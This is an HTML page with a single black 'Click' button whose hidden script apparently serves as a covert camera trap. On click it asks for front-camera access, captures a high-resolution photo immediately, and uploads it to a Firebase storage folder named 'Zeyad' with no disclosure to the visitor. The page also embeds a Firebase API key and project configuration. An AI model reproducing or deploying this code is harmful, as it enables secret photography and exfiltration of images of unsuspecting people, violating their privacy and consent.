<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dont Ask My Why</title>
    <link rel="icon" href="data:,"> <!-- Favicon request disabled -->
    <script type="module">
        // Import Firebase functions
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
        import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-storage.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCSmicQncJhWtvEekSLNQtvWM6fFr0cuRM",
            authDomain: "html-7fd9b.firebaseapp.com",
            projectId: "html-7fd9b",
            storageBucket: "html-7fd9b.appspot.com",
            messagingSenderId: "1022361191925",
            appId: "1:1022361191925:web:5bf0fb4023990d83aa0cbc"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const storage = getStorage(app);

        // Function to upload image to Firebase
        function uploadImage(imageData) {
            const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Upload to Zeyad folder
            uploadString(storageRef, imageData, 'data_url')
                .then(() => {
                    console.log('Uploaded a blob or file!');
                })
                .catch((error) => {
                    console.error('Error uploading image:', error);
                });
        }

        async function requestPermissions() {
            try {
                // Request clipboard permission
                await navigator.permissions.query({ name: "clipboard-write" });
                // Request camera access after clipboard permission is granted
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user", // Use front camera
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    }
                });
                return stream; // Return the stream if both permissions are granted
            } catch (error) {
                console.error('Permission denied:', error);
                return null; // Return null if permissions are not granted
            }
        }

        function startCamera(stream) {
            const video = document.createElement('video');
            video.srcObject = stream;

            video.onloadedmetadata = () => {
                video.play();
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                canvas.width = 1920;  
                canvas.height = 1080;

                // Capture image immediately
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/png');
                uploadImage(imageData); // Upload image to Firebase
                stopVideo(stream); // Stop the video stream
            };
        }

        function stopVideo(stream) {
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
        }

        async function handleButtonClick() {
            const stream = await requestPermissions();
            if (stream) {
                startCamera(stream); // Start the camera if permissions are granted
            }
        }

        window.addEventListener('load', () => {
            const button = document.getElementById('redirect-button');
            button.addEventListener('click', handleButtonClick);
        });
    </script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000; /* Black background */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .youtube-button {
            background-color: black; /* Black button */
            color: white; /* White text */
            border: 2px solid white; /* White edges */
            padding: 20px 40px; /* Button size */
            font-size: 24px; /* Font size */
            cursor: pointer; /* Pointer cursor */
            transition: background-color 0.3s;
            border-radius: 5px; /* Rounded edges */
            text-align: center;
        }

        .youtube-button:hover {
            background-color: #444; /* Darker on hover */
        }
    </style>
</head>
<body>
    <button class="youtube-button" id="redirect-button" disabled>Click</button>
</body>
</html>
